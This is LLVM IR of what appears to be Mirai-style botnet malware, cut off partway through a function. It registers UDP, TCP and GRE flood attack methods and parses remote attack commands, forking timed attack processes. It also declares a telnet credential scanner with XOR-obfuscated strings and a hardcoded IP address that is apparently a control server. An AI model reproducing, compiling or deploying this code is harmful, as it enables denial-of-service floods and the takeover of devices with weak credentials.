; ModuleID = 'llvm-link'
source_filename = "llvm-link"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.scanner_connection = type { %struct.scanner_auth*, i32, i32, i32, i32, i16, i32, [256 x i8], i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }
%struct.fd_set.26 = type { [16 x i64] }
%struct.timeval.27 = type { i64, i64 }

@methods_len = dso_local global i8 0, align 1
@methods = dso_local global %struct.attack_method** null, align 8
@attack_ongoing = dso_local global [15 x i32] zeroinitializer, align 16
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@auth_table_len = dso_local global i32 0, align 4
@scanner_rawpkt = dso_local global [40 x i8] zeroinitializer, align 16
@auth_table = dso_local global %struct.scanner_auth* null, align 8
@auth_table_max_weight = dso_local global i16 0, align 2
@fake_time = dso_local global i32 0, align 4
@scanner_pid = dso_local global i32 0, align 4
@conn_table = dso_local global %struct.scanner_connection* null, align 8
@rsck = dso_local global i32 0, align 4
@.str = private unnamed_addr constant [8 x i8] c"0125!8 \00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"58 '8%\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"\1B,<8#\07\13l\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c" 8\1E#$6;b\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"\07f2\13%\1A\12'\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"&;; \00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c",7gaae\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"\22=.,\22\00", align 1
@.str.9 = private unnamed_addr constant [7 x i8] c"?8\22efg\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"509=:\00", align 1
@.str.11 = private unnamed_addr constant [9 x i8] c".-50efg`\00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c".8,,z\00", align 1
@.str.13 = private unnamed_addr constant [13 x i8] c"c!>\19?;d\22=.,\22\00", align 1
@.str.14 = private unnamed_addr constant [13 x i8] c"c!>\19?;d509=:\00", align 1
@.str.15 = private unnamed_addr constant [7 x i8] c"<=gael\00", align 1
@.str.16 = private unnamed_addr constant [8 x i8] c"75 edfm\00", align 1
@.str.17 = private unnamed_addr constant [10 x i8] c"5::=1fdef\00", align 1
@.str.18 = private unnamed_addr constant [9 x i8] c"7<5:3191\00", align 1
@.str.19 = private unnamed_addr constant [6 x i8] c"3!1' \00", align 1
@.str.20 = private unnamed_addr constant [7 x i8] c"efg`a.\00", align 1
@.str.21 = private unnamed_addr constant [7 x i8] c"efg`ab\00", align 1
@.str.22 = private unnamed_addr constant [5 x i8] c"!'1&\00", align 1
@.str.23 = private unnamed_addr constant [5 x i8] c"$5''\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"$5''#;&0\00", align 1
@.str.25 = private unnamed_addr constant [10 x i8] c"509=:efg`\00", align 1
@.str.26 = private unnamed_addr constant [8 x i8] c"'!$$;& \00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"93gadd\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"91&8=:\00", align 1
@.str.29 = private unnamed_addr constant [7 x i8] c"0519;:\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"!6: \00", align 1
@.str.31 = private unnamed_addr constant [4 x i8] c"509\00", align 1
@.str.32 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@__const.consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@__const.consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@.str.33 = private unnamed_addr constant [14 x i8] c"159.65.82.169\00", align 1
@table_key = dso_local global i32 -555811921, align 4
@table = dso_local global [31 x %struct.table_value] zeroinitializer, align 16
@LOCAL_ADDR = dso_local global i32 0, align 4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 noundef zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_udpgeneric)
  call void @add_attack(i8 noundef zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_udpvse)
  call void @add_attack(i8 noundef zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_udpdns)
  call void @add_attack(i8 noundef zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_udpplain)
  call void @add_attack(i8 noundef zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_tcpsyn)
  call void @add_attack(i8 noundef zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_tcpack)
  call void @add_attack(i8 noundef zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_tcpstomp)
  call void @add_attack(i8 noundef zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_tcpxmas)
  call void @add_attack(i8 noundef zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_greip)
  call void @add_attack(i8 noundef zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_greeth)
  call void @add_attack(i8 noundef zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_std)
  ret i8 1
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @add_attack(i8 noundef zeroext %0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef %1) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 noundef 1, i64 noundef 16) #7
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* noundef %15, i64 noundef %20) #7
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64 noundef, i64 noundef) #1

; Function Attrs: nounwind
declare i8* @realloc(i8* noundef, i64 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

2:                                                ; preds = %21, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 15
  br i1 %4, label %5, label %24

5:                                                ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

11:                                               ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 noundef %15, i32 noundef 9) #7
  br label %17

17:                                               ; preds = %11, %5
  %18 = load i32, i32* %1, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %19
  store i32 0, i32* %20, align 4
  br label %21

21:                                               ; preds = %17
  %22 = load i32, i32* %1, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %1, align 4
  br label %2, !llvm.loop !6

24:                                               ; preds = %2
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32 noundef, i32 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_parse(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

16:                                               ; preds = %2
  br label %219

17:                                               ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 noundef %20) #8
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 %25, 4
  %27 = trunc i64 %26 to i32
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %31

30:                                               ; preds = %17
  br label %219

31:                                               ; preds = %17
  %32 = load i8*, i8** %3, align 8
  %33 = getelementptr inbounds i8, i8* %32, i32 1
  store i8* %33, i8** %3, align 8
  %34 = load i8, i8* %32, align 1
  store i8 %34, i8* %7, align 1
  %35 = load i32, i32* %4, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 %36, 1
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %4, align 4
  %39 = load i32, i32* %4, align 4
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %41, label %42

41:                                               ; preds = %31
  br label %219

42:                                               ; preds = %31
  %43 = load i8*, i8** %3, align 8
  %44 = getelementptr inbounds i8, i8* %43, i32 1
  store i8* %44, i8** %3, align 8
  %45 = load i8, i8* %43, align 1
  store i8 %45, i8* %8, align 1
  %46 = load i32, i32* %4, align 4
  %47 = sext i32 %46 to i64
  %48 = sub i64 %47, 1
  %49 = trunc i64 %48 to i32
  store i32 %49, i32* %4, align 4
  %50 = load i8, i8* %8, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %54

53:                                               ; preds = %42
  br label %219

54:                                               ; preds = %42
  %55 = load i32, i32* %4, align 4
  %56 = sext i32 %55 to i64
  %57 = load i8, i8* %8, align 1
  %58 = zext i8 %57 to i64
  %59 = mul i64 5, %58
  %60 = icmp ult i64 %56, %59
  br i1 %60, label %61, label %62

61:                                               ; preds = %54
  br label %219

62:                                               ; preds = %54
  %63 = load i8, i8* %8, align 1
  %64 = zext i8 %63 to i64
  %65 = call noalias i8* @calloc(i64 noundef %64, i64 noundef 24) #7
  %66 = bitcast i8* %65 to %struct.attack_target*
  store %struct.attack_target* %66, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %67

67:                                               ; preds = %114, %62
  %68 = load i32, i32* %5, align 4
  %69 = load i8, i8* %8, align 1
  %70 = zext i8 %69 to i32
  %71 = icmp slt i32 %68, %70
  br i1 %71, label %72, label %117

72:                                               ; preds = %67
  %73 = load i8*, i8** %3, align 8
  %74 = bitcast i8* %73 to i32*
  %75 = load i32, i32* %74, align 4
  %76 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %77 = load i32, i32* %5, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %76, i64 %78
  %80 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %79, i32 0, i32 1
  store i32 %75, i32* %80, align 4
  %81 = load i8*, i8** %3, align 8
  %82 = getelementptr inbounds i8, i8* %81, i64 4
  store i8* %82, i8** %3, align 8
  %83 = load i8*, i8** %3, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %3, align 8
  %85 = load i8, i8* %83, align 1
  %86 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %87 = load i32, i32* %5, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i64 %88
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %89, i32 0, i32 2
  store i8 %85, i8* %90, align 4
  %91 = load i32, i32* %4, align 4
  %92 = sext i32 %91 to i64
  %93 = sub i64 %92, 5
  %94 = trunc i64 %93 to i32
  store i32 %94, i32* %4, align 4
  %95 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i64 %97
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %98, i32 0, i32 0
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %99, i32 0, i32 0
  store i16 2, i16* %100, align 4
  %101 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %101, i64 %103
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %104, i32 0, i32 1
  %106 = load i32, i32* %105, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 0
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %111, i32 0, i32 2
  %113 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %112, i32 0, i32 0
  store i32 %106, i32* %113, align 4
  br label %114

114:                                              ; preds = %72
  %115 = load i32, i32* %5, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %5, align 4
  br label %67, !llvm.loop !8

117:                                              ; preds = %67
  %118 = load i32, i32* %4, align 4
  %119 = sext i32 %118 to i64
  %120 = icmp ult i64 %119, 1
  br i1 %120, label %121, label %122

121:                                              ; preds = %117
  br label %219

122:                                              ; preds = %117
  %123 = load i8*, i8** %3, align 8
  %124 = getelementptr inbounds i8, i8* %123, i32 1
  store i8* %124, i8** %3, align 8
  %125 = load i8, i8* %123, align 1
  store i8 %125, i8* %9, align 1
  %126 = load i32, i32* %4, align 4
  %127 = sext i32 %126 to i64
  %128 = sub i64 %127, 1
  %129 = trunc i64 %128 to i32
  store i32 %129, i32* %4, align 4
  %130 = load i8, i8* %9, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp sgt i32 %131, 0
  br i1 %132, label %133, label %211

133:                                              ; preds = %122
  %134 = load i8, i8* %9, align 1
  %135 = zext i8 %134 to i64
  %136 = call noalias i8* @calloc(i64 noundef %135, i64 noundef 16) #7
  %137 = bitcast i8* %136 to %struct.attack_option*
  store %struct.attack_option* %137, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %138

138:                                              ; preds = %207, %133
  %139 = load i32, i32* %5, align 4
  %140 = load i8, i8* %9, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp slt i32 %139, %141
  br i1 %142, label %143, label %210

143:                                              ; preds = %138
  %144 = load i32, i32* %4, align 4
  %145 = sext i32 %144 to i64
  %146 = icmp ult i64 %145, 1
  br i1 %146, label %147, label %148

147:                                              ; preds = %143
  br label %219

148:                                              ; preds = %143
  %149 = load i8*, i8** %3, align 8
  %150 = getelementptr inbounds i8, i8* %149, i32 1
  store i8* %150, i8** %3, align 8
  %151 = load i8, i8* %149, align 1
  %152 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %153 = load i32, i32* %5, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %155, i32 0, i32 1
  store i8 %151, i8* %156, align 8
  %157 = load i32, i32* %4, align 4
  %158 = sext i32 %157 to i64
  %159 = sub i64 %158, 1
  %160 = trunc i64 %159 to i32
  store i32 %160, i32* %4, align 4
  %161 = load i32, i32* %4, align 4
  %162 = sext i32 %161 to i64
  %163 = icmp ult i64 %162, 1
  br i1 %163, label %164, label %165

164:                                              ; preds = %148
  br label %219

165:                                              ; preds = %148
  %166 = load i8*, i8** %3, align 8
  %167 = getelementptr inbounds i8, i8* %166, i32 1
  store i8* %167, i8** %3, align 8
  %168 = load i8, i8* %166, align 1
  store i8 %168, i8* %12, align 1
  %169 = load i32, i32* %4, align 4
  %170 = sext i32 %169 to i64
  %171 = sub i64 %170, 1
  %172 = trunc i64 %171 to i32
  store i32 %172, i32* %4, align 4
  %173 = load i32, i32* %4, align 4
  %174 = load i8, i8* %12, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp slt i32 %173, %175
  br i1 %176, label %177, label %178

177:                                              ; preds = %165
  br label %219

178:                                              ; preds = %165
  %179 = load i8, i8* %12, align 1
  %180 = zext i8 %179 to i32
  %181 = add nsw i32 %180, 1
  %182 = sext i32 %181 to i64
  %183 = call noalias i8* @calloc(i64 noundef %182, i64 noundef 1) #7
  %184 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %185 = load i32, i32* %5, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %187, i32 0, i32 0
  store i8* %183, i8** %188, align 8
  %189 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %190 = load i32, i32* %5, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %192, i32 0, i32 0
  %194 = load i8*, i8** %193, align 8
  %195 = load i8*, i8** %3, align 8
  %196 = load i8, i8* %12, align 1
  %197 = zext i8 %196 to i32
  call void @util_memcpy(i8* noundef %194, i8* noundef %195, i32 noundef %197)
  %198 = load i8, i8* %12, align 1
  %199 = zext i8 %198 to i32
  %200 = load i8*, i8** %3, align 8
  %201 = sext i32 %199 to i64
  %202 = getelementptr inbounds i8, i8* %200, i64 %201
  store i8* %202, i8** %3, align 8
  %203 = load i8, i8* %12, align 1
  %204 = zext i8 %203 to i32
  %205 = load i32, i32* %4, align 4
  %206 = sub nsw i32 %205, %204
  store i32 %206, i32* %4, align 4
  br label %207

207:                                              ; preds = %178
  %208 = load i32, i32* %5, align 4
  %209 = add nsw i32 %208, 1
  store i32 %209, i32* %5, align 4
  br label %138, !llvm.loop !9

210:                                              ; preds = %138
  br label %211

211:                                              ; preds = %210, %122
  %212 = call i32* @__errno_location() #8
  store i32 0, i32* %212, align 4
  %213 = load i32, i32* %6, align 4
  %214 = load i8, i8* %7, align 1
  %215 = load i8, i8* %8, align 1
  %216 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %217 = load i8, i8* %9, align 1
  %218 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 noundef %213, i8 noundef zeroext %214, i8 noundef zeroext %215, %struct.attack_target* noundef %216, i8 noundef zeroext %217, %struct.attack_option* noundef %218)
  br label %219

219:                                              ; preds = %211, %177, %164, %147, %121, %61, %53, %41, %30, %16
  %220 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %221 = icmp ne %struct.attack_target* %220, null
  br i1 %221, label %222, label %225

222:                                              ; preds = %219
  %223 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %224 = bitcast %struct.attack_target* %223 to i8*
  call void @free(i8* noundef %224) #7
  br label %225

225:                                              ; preds = %222, %219
  %226 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %227 = icmp ne %struct.attack_option* %226, null
  br i1 %227, label %228, label %232

228:                                              ; preds = %225
  %229 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %230 = load i8, i8* %9, align 1
  %231 = zext i8 %230 to i32
  call void @free_opts(%struct.attack_option* noundef %229, i32 noundef %231)
  br label %232

232:                                              ; preds = %228, %225
  ret void
}

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32 noundef) #2

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_start(i32 noundef %0, i8 noundef zeroext %1, i8 noundef zeroext %2, %struct.attack_target* noundef %3, i8 noundef zeroext %4, %struct.attack_option* noundef %5) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #7
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %22, label %19

19:                                               ; preds = %6
  %20 = load i32, i32* %13, align 4
  %21 = icmp sgt i32 %20, 0
  br i1 %21, label %22, label %23

22:                                               ; preds = %19, %6
  ret void

23:                                               ; preds = %19
  %24 = call i32 @fork() #7
  store i32 %24, i32* %14, align 4
  %25 = load i32, i32* %14, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %28

27:                                               ; preds = %23
  call void @exit(i32 noundef 0) #9
  unreachable

28:                                               ; preds = %23
  %29 = load i32, i32* %14, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %36

31:                                               ; preds = %28
  %32 = load i32, i32* %7, align 4
  %33 = call i32 @sleep(i32 noundef %32)
  %34 = call i32 @getppid() #7
  %35 = call i32 @kill(i32 noundef %34, i32 noundef 9) #7
  call void @exit(i32 noundef 0) #9
  unreachable

36:                                               ; preds = %28
  store i32 0, i32* %15, align 4
  br label %37

37:                                               ; preds = %67, %36
  %38 = load i32, i32* %15, align 4
  %39 = load i8, i8* @methods_len, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp slt i32 %38, %40
  br i1 %41, label %42, label %70

42:                                               ; preds = %37
  %43 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %44 = load i32, i32* %15, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %43, i64 %45
  %47 = load %struct.attack_method*, %struct.attack_method** %46, align 8
  %48 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %47, i32 0, i32 1
  %49 = load i8, i8* %48, align 8
  %50 = zext i8 %49 to i32
  %51 = load i8, i8* %8, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %50, %52
  br i1 %53, label %54, label %66

54:                                               ; preds = %42
  %55 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %55, i64 %57
  %59 = load %struct.attack_method*, %struct.attack_method** %58, align 8
  %60 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %59, i32 0, i32 0
  %61 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %60, align 8
  %62 = load i8, i8* %9, align 1
  %63 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %64 = load i8, i8* %11, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %61(i8 noundef zeroext %62, %struct.attack_target* noundef %63, i8 noundef zeroext %64, %struct.attack_option* noundef %65)
  br label %70

66:                                               ; preds = %42
  br label %67

67:                                               ; preds = %66
  %68 = load i32, i32* %15, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %15, align 4
  br label %37, !llvm.loop !10

70:                                               ; preds = %54, %37
  call void @exit(i32 noundef 0) #9
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @free_opts(%struct.attack_option* noundef %0, i32 noundef %1) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

8:                                                ; preds = %2
  br label %36

9:                                                ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

10:                                               ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %33

14:                                               ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

22:                                               ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* noundef %28) #7
  br label %29

29:                                               ; preds = %22, %14
  br label %30

30:                                               ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = add nsw i32 %31, 1
  store i32 %32, i32* %5, align 4
  br label %10, !llvm.loop !11

33:                                               ; preds = %10
  %34 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %35 = bitcast %struct.attack_option* %34 to i8*
  call void @free(i8* noundef %35) #7
  br label %36

36:                                               ; preds = %33, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32 noundef) #3

declare i32 @sleep(i32 noundef) #4

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @attack_get_opt_str(i8 noundef zeroext %0, %struct.attack_option* noundef %1, i8 noundef zeroext %2, i8* noundef %3) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
